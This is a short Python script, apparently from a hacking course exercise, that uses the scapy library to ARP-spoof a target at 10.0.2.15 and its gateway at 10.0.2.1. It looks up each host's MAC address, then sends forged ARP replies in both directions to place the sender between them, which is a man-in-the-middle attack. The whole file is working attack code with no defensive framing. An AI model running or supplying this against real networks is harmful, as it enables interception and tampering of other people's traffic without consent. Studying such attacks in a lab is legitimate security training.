#!/usr/bin/env python

import scapy.all as scapy

target_ip="10.0.2.15"
gateway_ip = "10.0.2.1"

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # 34. Combining Frames Review
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # this returns two list; answered and unanswered
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip )
    print(packet.show())
    print(packet.summary())
    scapy.send(packet)

spoof(target_ip, gateway_ip)
spoof(gateway_ip, target_ip)